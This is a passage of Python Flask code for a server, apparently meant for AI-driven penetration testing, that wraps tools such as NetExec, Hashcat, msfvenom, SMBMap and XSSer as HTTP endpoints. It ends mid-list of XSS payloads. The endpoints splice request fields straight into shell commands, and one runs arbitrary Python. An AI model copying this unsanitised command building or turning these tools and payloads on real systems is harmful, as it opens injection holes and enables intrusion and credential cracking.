        module = params.get("module", "")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("🎯 NetExec called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"nxc {protocol} {target}"
        
        if username:
            command += f" -u {username}"
            
        if password:
            command += f" -p {password}"
            
        if hash_value:
            command += f" -H {hash_value}"
            
        if module:
            command += f" -M {module}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting NetExec {protocol} scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 NetExec scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in netexec endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/amass", methods=["POST"])
def amass():
    """Execute Amass for subdomain enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        mode = params.get("mode", "enum")
        additional_args = params.get("additional_args", "")
        
        if not domain:
            logger.warning("🌐 Amass called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400
        
        command = f"amass {mode}"
        
        if mode == "enum":
            command += f" -d {domain}"
        else:
            command += f" -d {domain}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Amass {mode}: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Amass completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in amass endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hashcat", methods=["POST"])
def hashcat():
    """Execute Hashcat for password cracking with enhanced logging"""
    try:
        params = request.json
        hash_file = params.get("hash_file", "")
        hash_type = params.get("hash_type", "")
        attack_mode = params.get("attack_mode", "0")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        mask = params.get("mask", "")
        additional_args = params.get("additional_args", "")
        
        if not hash_file:
            logger.warning("🔐 Hashcat called without hash_file parameter")
            return jsonify({
                "error": "Hash file parameter is required"
            }), 400
            
        if not hash_type:
            logger.warning("🔐 Hashcat called without hash_type parameter")
            return jsonify({
                "error": "Hash type parameter is required"
            }), 400
        
        command = f"hashcat -m {hash_type} -a {attack_mode} {hash_file}"
        
        if attack_mode == "0" and wordlist:
            command += f" {wordlist}"
        elif attack_mode == "3" and mask:
            command += f" {mask}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔐 Starting Hashcat attack: mode {attack_mode}")
        result = execute_command(command)
        logger.info(f"📊 Hashcat attack completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hashcat endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/subfinder", methods=["POST"])
def subfinder():
    """Execute Subfinder for passive subdomain enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        silent = params.get("silent", True)
        all_sources = params.get("all_sources", False)
        additional_args = params.get("additional_args", "")
        
        if not domain:
            logger.warning("🌐 Subfinder called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400
        
        command = f"subfinder -d {domain}"
        
        if silent:
            command += " -silent"
            
        if all_sources:
            command += " -all"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Subfinder: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Subfinder completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in subfinder endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/smbmap", methods=["POST"])
def smbmap():
    """Execute SMBMap for SMB share enumeration with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        username = params.get("username", "")
        password = params.get("password", "")
        domain = params.get("domain", "")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("🎯 SMBMap called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"smbmap -H {target}"
        
        if username:
            command += f" -u {username}"
            
        if password:
            command += f" -p {password}"
            
        if domain:
            command += f" -d {domain}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting SMBMap: {target}")
        result = execute_command(command)
        logger.info(f"📊 SMBMap completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in smbmap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/volatility", methods=["POST"])
def volatility():
    """Execute Volatility for memory forensics with enhanced logging"""
    try:
        params = request.json
        memory_file = params.get("memory_file", "")
        plugin = params.get("plugin", "")
        profile = params.get("profile", "")
        additional_args = params.get("additional_args", "")
        
        if not memory_file:
            logger.warning("🧠 Volatility called without memory_file parameter")
            return jsonify({
                "error": "Memory file parameter is required"
            }), 400
            
        if not plugin:
            logger.warning("🧠 Volatility called without plugin parameter")
            return jsonify({
                "error": "Plugin parameter is required"
            }), 400
        
        command = f"volatility -f {memory_file}"
        
        if profile:
            command += f" --profile={profile}"
            
        command += f" {plugin}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🧠 Starting Volatility analysis: {plugin}")
        result = execute_command(command)
        logger.info(f"📊 Volatility analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in volatility endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/msfvenom", methods=["POST"])
def msfvenom():
    """Execute MSFVenom to generate payloads with enhanced logging"""
    try:
        params = request.json
        payload = params.get("payload", "")
        format_type = params.get("format", "")
        output_file = params.get("output_file", "")
        encoder = params.get("encoder", "")
        iterations = params.get("iterations", "")
        additional_args = params.get("additional_args", "")
        
        if not payload:
            logger.warning("🚀 MSFVenom called without payload parameter")
            return jsonify({
                "error": "Payload parameter is required"
            }), 400
        
        command = f"msfvenom -p {payload}"
        
        if format_type:
            command += f" -f {format_type}"
            
        if output_file:
            command += f" -o {output_file}"
            
        if encoder:
            command += f" -e {encoder}"
            
        if iterations:
            command += f" -i {iterations}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🚀 Starting MSFVenom payload generation: {payload}")
        result = execute_command(command)
        logger.info(f"📊 MSFVenom payload generated")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in msfvenom endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# BINARY ANALYSIS & REVERSE ENGINEERING TOOLS
# ============================================================================

@app.route("/api/tools/gdb", methods=["POST"])
def gdb():
    """Execute GDB for binary analysis and debugging with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        script_file = params.get("script_file", "")
        additional_args = params.get("additional_args", "")
        
        if not binary:
            logger.warning("🔧 GDB called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400
        
        command = f"gdb {binary}"
        
        if script_file:
            command += f" -x {script_file}"
        
        if commands:
            temp_script = "/tmp/gdb_commands.txt"
            with open(temp_script, "w") as f:
                f.write(commands)
            command += f" -x {temp_script}"
            
        if additional_args:
            command += f" {additional_args}"
            
        command += " -batch"
        
        logger.info(f"🔧 Starting GDB analysis: {binary}")
        result = execute_command(command)
        
        if commands and os.path.exists("/tmp/gdb_commands.txt"):
            try:
                os.remove("/tmp/gdb_commands.txt")
            except:
                pass
                
        logger.info(f"📊 GDB analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in gdb endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/radare2", methods=["POST"])
def radare2():
    """Execute Radare2 for binary analysis and reverse engineering with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        additional_args = params.get("additional_args", "")
        
        if not binary:
            logger.warning("🔧 Radare2 called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400
        
        if commands:
            temp_script = "/tmp/r2_commands.txt"
            with open(temp_script, "w") as f:
                f.write(commands)
            command = f"r2 -i {temp_script} -q {binary}"
        else:
            command = f"r2 -q {binary}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔧 Starting Radare2 analysis: {binary}")
        result = execute_command(command)
        
        if commands and os.path.exists("/tmp/r2_commands.txt"):
            try:
                os.remove("/tmp/r2_commands.txt")
            except:
                pass
                
        logger.info(f"📊 Radare2 analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in radare2 endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/binwalk", methods=["POST"])
def binwalk():
    """Execute Binwalk for firmware and file analysis with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        extract = params.get("extract", False)
        additional_args = params.get("additional_args", "")
        
        if not file_path:
            logger.warning("🔧 Binwalk called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400
        
        command = f"binwalk"
        
        if extract:
            command += " -e"
            
        if additional_args:
            command += f" {additional_args}"
            
        command += f" {file_path}"
        
        logger.info(f"🔧 Starting Binwalk analysis: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 Binwalk analysis completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in binwalk endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/ropgadget", methods=["POST"])
def ropgadget():
    """Search for ROP gadgets in a binary using ROPgadget with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        gadget_type = params.get("gadget_type", "")
        additional_args = params.get("additional_args", "")
        
        if not binary:
            logger.warning("🔧 ROPgadget called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400
        
        command = f"ROPgadget --binary {binary}"
        
        if gadget_type:
            command += f" --only '{gadget_type}'"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔧 Starting ROPgadget search: {binary}")
        result = execute_command(command)
        logger.info(f"📊 ROPgadget search completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ropgadget endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/checksec", methods=["POST"])
def checksec():
    """Check security features of a binary with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        
        if not binary:
            logger.warning("🔧 Checksec called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400
        
        command = f"checksec --file={binary}"
        
        logger.info(f"🔧 Starting Checksec analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 Checksec analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in checksec endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/xxd", methods=["POST"])
def xxd():
    """Create a hex dump of a file using xxd with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        offset = params.get("offset", "0")
        length = params.get("length", "")
        additional_args = params.get("additional_args", "")
        
        if not file_path:
            logger.warning("🔧 XXD called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400
        
        command = f"xxd -s {offset}"
        
        if length:
            command += f" -l {length}"
            
        if additional_args:
            command += f" {additional_args}"
            
        command += f" {file_path}"
        
        logger.info(f"🔧 Starting XXD hex dump: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 XXD hex dump completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in xxd endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/strings", methods=["POST"])
def strings():
    """Extract strings from a binary file with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        min_len = params.get("min_len", 4)
        additional_args = params.get("additional_args", "")
        
        if not file_path:
            logger.warning("🔧 Strings called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400
        
        command = f"strings -n {min_len}"
        
        if additional_args:
            command += f" {additional_args}"
            
        command += f" {file_path}"
        
        logger.info(f"🔧 Starting Strings extraction: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 Strings extraction completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in strings endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/objdump", methods=["POST"])
def objdump():
    """Analyze a binary using objdump with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        disassemble = params.get("disassemble", True)
        additional_args = params.get("additional_args", "")
        
        if not binary:
            logger.warning("🔧 Objdump called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400
        
        command = f"objdump"
        
        if disassemble:
            command += " -d"
        else:
            command += " -x"
            
        if additional_args:
            command += f" {additional_args}"
            
        command += f" {binary}"
        
        logger.info(f"🔧 Starting Objdump analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 Objdump analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in objdump endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADDITIONAL WEB SECURITY TOOLS
# ============================================================================

@app.route("/api/tools/feroxbuster", methods=["POST"])
def feroxbuster():
    """Execute Feroxbuster for recursive content discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        threads = params.get("threads", 10)
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🌐 Feroxbuster called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"feroxbuster -u {url} -w {wordlist} -t {threads}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Feroxbuster scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Feroxbuster scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in feroxbuster endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dotdotpwn", methods=["POST"])
def dotdotpwn():
    """Execute DotDotPwn for directory traversal testing with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        module = params.get("module", "http")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("🎯 DotDotPwn called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"dotdotpwn -m {module} -h {target}"
        
        if additional_args:
            command += f" {additional_args}"
        
        command += " -b"
        
        logger.info(f"🔍 Starting DotDotPwn scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 DotDotPwn scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dotdotpwn endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/xsser", methods=["POST"])
def xsser():
    """Execute XSSer for XSS vulnerability testing with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        params_str = params.get("params", "")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🌐 XSSer called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"xsser --url '{url}'"
        
        if params_str:
            command += f" --param='{params_str}'"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting XSSer scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 XSSer scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in xsser endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wfuzz", methods=["POST"])
def wfuzz():
    """Execute Wfuzz for web application fuzzing with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🌐 Wfuzz called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"wfuzz -w {wordlist} '{url}'"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Wfuzz scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Wfuzz scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wfuzz endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED WEB SECURITY TOOLS CONTINUED
# ============================================================================

@app.route("/api/tools/burpsuite", methods=["POST"])
def burpsuite():
    """Execute Burp Suite with enhanced logging"""
    try:
        params = request.json
        project_file = params.get("project_file", "")
        config_file = params.get("config_file", "")
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")
        headless = params.get("headless", False)
        scan_type = params.get("scan_type", "")
        scan_config = params.get("scan_config", "")
        output_file = params.get("output_file", "")
        
        command = "burpsuite"
        
        if headless:
            command += " --headless"
            
        if project_file:
            command += f" --project-file=\"{project_file}\""
            
        if config_file:
            command += f" --config-file=\"{config_file}\""
            
        if target:
            command += f" --target=\"{target}\""
            
        if headless and scan_type:
            command += f" --{scan_type}"
            
        if scan_config:
            command += f" --scan-config=\"{scan_config}\""
            
        if output_file:
            command += f" --output-file=\"{output_file}\""
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Burp Suite scan")
        result = execute_command(command)
        logger.info(f"📊 Burp Suite scan completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in burpsuite endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/zap", methods=["POST"])
def zap():
    """Execute OWASP ZAP with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        scan_type = params.get("scan_type", "baseline")
        api_key = params.get("api_key", "")
        daemon = params.get("daemon", False)
        port = params.get("port", "8090")
        host = params.get("host", "0.0.0.0")
        format_type = params.get("format", "xml")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")
        
        if not target and scan_type != "daemon":
            logger.warning("🎯 ZAP called without target parameter")
            return jsonify({
                "error": "Target parameter is required for scans"
            }), 400
        
        if daemon:
            command = f"zaproxy -daemon -host {host} -port {port}"
            if api_key:
                command += f" -config api.key={api_key}"
        else:
            command = f"zaproxy -cmd -quickurl {target}"
                
            if format_type:
                command += f" -quickout {format_type}"
                
            if output_file:
                command += f" -quickprogress -dir \"{output_file}\""
                
            if api_key:
                command += f" -config api.key={api_key}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting ZAP scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 ZAP scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in zap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/arjun", methods=["POST"])
def arjun():
    """Execute Arjun for parameter discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        method = params.get("method", "GET")
        data = params.get("data", "")
        headers = params.get("headers", "")
        timeout = params.get("timeout", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")
        
        if not url:
            logger.warning("🎯 Arjun called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400
        
        command = f"arjun -u \"{url}\" -m {method}"
        
        if data and method.upper() == "POST":
            command += f" -d \"{data}\""
            
        if headers:
            command += f" -H \"{headers}\""
            
        if timeout:
            command += f" -t {timeout}"
            
        if output_file:
            command += f" -o \"{output_file}\""
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Arjun parameter discovery: {url}")
        result = execute_command(command)
        logger.info(f"📊 Arjun completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in arjun endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wafw00f", methods=["POST"])
def wafw00f():
    """Execute wafw00f to identify and fingerprint WAF products with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")
        
        if not target:
            logger.warning("🛡️ Wafw00f called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400
        
        command = f"wafw00f {target}"
        
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🛡️ Starting Wafw00f WAF detection: {target}")
        result = execute_command(command)
        logger.info(f"📊 Wafw00f completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wafw00f endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/fierce", methods=["POST"])
def fierce():
    """Execute fierce for DNS reconnaissance with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        dns_server = params.get("dns_server", "")
        additional_args = params.get("additional_args", "")
        
        if not domain:
            logger.warning("🌐 Fierce called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400
        
        command = f"fierce --domain {domain}"
        
        if dns_server:
            command += f" --dns-servers {dns_server}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting Fierce DNS recon: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Fierce completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in fierce endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dnsenum", methods=["POST"])
def dnsenum():
    """Execute dnsenum for DNS enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        dns_server = params.get("dns_server", "")
        wordlist = params.get("wordlist", "")
        additional_args = params.get("additional_args", "")
        
        if not domain:
            logger.warning("🌐 DNSenum called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400
        
        command = f"dnsenum {domain}"
        
        if dns_server:
            command += f" --dnsserver {dns_server}"
            
        if wordlist:
            command += f" --file {wordlist}"
            
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting DNSenum: {domain}")
        result = execute_command(command)
        logger.info(f"📊 DNSenum completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dnsenum endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/autorecon", methods=["POST"])
def autorecon():
    """Execute AutoRecon for comprehensive target enumeration with full parameter support."""
    try:
        params = request.json
        # Basic parameters
        target = params.get("target", "")
        target_file = params.get("target_file", "")
        ports = params.get("ports", "")
        output_dir = params.get("output_dir", "")
        
        # Scan control parameters
        max_scans = params.get("max_scans", "")
        max_port_scans = params.get("max_port_scans", "")
        heartbeat = params.get("heartbeat", "")
        timeout = params.get("timeout", "")
        target_timeout = params.get("target_timeout", "")
        
        # Configuration parameters
        config_file = params.get("config_file", "")
        global_file = params.get("global_file", "")
        plugins_dir = params.get("plugins_dir", "")
        add_plugins_dir = params.get("add_plugins_dir", "")
        
        # Plugin selection parameters
        tags = params.get("tags", "")
        exclude_tags = params.get("exclude_tags", "")
        port_scans = params.get("port_scans", "")
        service_scans = params.get("service_scans", "")
        reports = params.get("reports", "")
        
        # Directory structure options
        single_target = params.get("single_target", False)
        only_scans_dir = params.get("only_scans_dir", False)
        no_port_dirs = params.get("no_port_dirs", False)
        
        # Nmap options
        nmap = params.get("nmap", "")
        nmap_append = params.get("nmap_append", "")
        
        # Misc options
        proxychains = params.get("proxychains", False)
        disable_sanity_checks = params.get("disable_sanity_checks", False)
        disable_keyboard_control = params.get("disable_keyboard_control", False)
        force_services = params.get("force_services", "")
        accessible = params.get("accessible", False)
        verbose = params.get("verbose", 0)  # 0 for none, 1+ for increasing verbosity
        
        # Plugin-specific options
        curl_path = params.get("curl_path", "")
        dirbuster_tool = params.get("dirbuster_tool", "")
        dirbuster_wordlist = params.get("dirbuster_wordlist", "")
        dirbuster_threads = params.get("dirbuster_threads", "")
        dirbuster_ext = params.get("dirbuster_ext", "")
        onesixtyone_community_strings = params.get("onesixtyone_community_strings", "")
        
        # Global plugin options
        global_username_wordlist = params.get("global_username_wordlist", "")
        global_password_wordlist = params.get("global_password_wordlist", "")
        global_domain = params.get("global_domain", "")
        
        # Additional arguments
        additional_args = params.get("additional_args", "")
        
        if not target and not target_file:
            logger.warning("🎯 AutoRecon called without target or target_file parameter")
            return jsonify({
                "error": "Either target or target_file parameter is required"
            }), 400
        
        # Build the command
        command = "autorecon"
        
        # Add target or target file
        if target:
            command += f" {target}"
        
        if target_file:
            command += f" -t {target_file}"
            
        # Add basic scan options
        if ports:
            command += f" -p {ports}"
            
        if output_dir:
            command += f" -o {output_dir}"
            
        # Add scan control parameters
        if max_scans:
            command += f" -m {max_scans}"
            
        if max_port_scans:
            command += f" -mp {max_port_scans}"
            
        if heartbeat:
            command += f" --heartbeat {heartbeat}"
            
        if timeout:
            command += f" --timeout {timeout}"
            
        if target_timeout:
            command += f" --target-timeout {target_timeout}"
            
        # Add configuration parameters
        if config_file:
            command += f" -c {config_file}"
            
        if global_file:
            command += f" -g {global_file}"
            
        if plugins_dir:
            command += f" --plugins-dir {plugins_dir}"
            
        if add_plugins_dir:
            command += f" --add-plugins-dir {add_plugins_dir}"
            
        # Add plugin selection parameters
        if tags:
            command += f" --tags {tags}"
            
        if exclude_tags:
            command += f" --exclude-tags {exclude_tags}"
            
        if port_scans:
            command += f" --port-scans {port_scans}"
            
        if service_scans:
            command += f" --service-scans {service_scans}"
            
        if reports:
            command += f" --reports {reports}"
            
        # Add directory structure options
        if single_target:
            command += " --single-target"
            
        if only_scans_dir:
            command += " --only-scans-dir"
            
        if no_port_dirs:
            command += " --no-port-dirs"
            
        # Add nmap options
        if nmap:
            command += f" --nmap \"{nmap}\""
            
        if nmap_append:
            command += f" --nmap-append \"{nmap_append}\""
            
        # Add misc options
        if proxychains:
            command += " --proxychains"
            
        if disable_sanity_checks:
            command += " --disable-sanity-checks"
            
        if disable_keyboard_control:
            command += " --disable-keyboard-control"
            
        if force_services:
            command += f" --force-services {force_services}"
            
        if accessible:
            command += " --accessible"
            
        # Add verbosity
        for _ in range(verbose):
            command += " -v"
            
        # Add plugin-specific options
        if curl_path:
            command += f" --curl.path {curl_path}"
            
        if dirbuster_tool:
            command += f" --dirbuster.tool {dirbuster_tool}"
            
        if dirbuster_wordlist:
            command += f" --dirbuster.wordlist {dirbuster_wordlist}"
            
        if dirbuster_threads:
            command += f" --dirbuster.threads {dirbuster_threads}"
            
        if dirbuster_ext:
            command += f" --dirbuster.ext {dirbuster_ext}"
            
        if onesixtyone_community_strings:
            command += f" --onesixtyone.community-strings {onesixtyone_community_strings}"
            
        # Add global plugin options
        if global_username_wordlist:
            command += f" --global.username-wordlist {global_username_wordlist}"
            
        if global_password_wordlist:
            command += f" --global.password-wordlist {global_password_wordlist}"
            
        if global_domain:
            command += f" --global.domain {global_domain}"
            
        # Add any additional arguments
        if additional_args:
            command += f" {additional_args}"
        
        logger.info(f"🔍 Starting AutoRecon comprehensive enumeration: {target}")
        result = execute_command(command)
        logger.info(f"📊 AutoRecon comprehensive enumeration completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in autorecon endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# Python Environment Management Endpoints
@app.route("/api/python/install", methods=["POST"])
def install_python_package():
    """Install a Python package in a virtual environment"""
    try:
        params = request.json
        package = params.get("package", "")
        env_name = params.get("env_name", "default")
        
        if not package:
            return jsonify({"error": "Package name is required"}), 400
        
        logger.info(f"📦 Installing Python package: {package} in env {env_name}")
        success = env_manager.install_package(env_name, package)
        
        if success:
            return jsonify({
                "success": True,
                "message": f"Package {package} installed successfully",
                "env_name": env_name
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to install package {package}"
            }), 500
            
    except Exception as e:
        logger.error(f"💥 Error installing Python package: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/python/execute", methods=["POST"])
def execute_python_script():
    """Execute a Python script in a virtual environment"""
    try:
        params = request.json
        script = params.get("script", "")
        env_name = params.get("env_name", "default")
        filename = params.get("filename", f"script_{int(time.time())}.py")
        
        if not script:
            return jsonify({"error": "Script content is required"}), 400
        
        # Create script file
        script_result = file_manager.create_file(filename, script)
        if not script_result["success"]:
            return jsonify(script_result), 500
        
        # Get Python path for environment
        python_path = env_manager.get_python_path(env_name)
        script_path = script_result["path"]
        
        # Execute script
        command = f"{python_path} {script_path}"
        logger.info(f"🐍 Executing Python script in env {env_name}: {filename}")
        result = execute_command(command, use_cache=False)
        
        # Clean up script file
        file_manager.delete_file(filename)
        
        result["env_name"] = env_name
        result["script_filename"] = filename
        logger.info(f"📊 Python script execution completed")
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"💥 Error executing Python script: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# AI-POWERED PAYLOAD GENERATION (v5.0 ENHANCEMENT) UNDER DEVELOPMENT
# ============================================================================

class AIPayloadGenerator:
    """AI-powered payload generation system with contextual intelligence"""
    
    def __init__(self):
        self.payload_templates = {
            "xss": {
                "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"],
                "advanced": [
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                    "\"><script>alert('XSS')</script><!--",
                    "<iframe src=\"javascript:alert('XSS')\">",
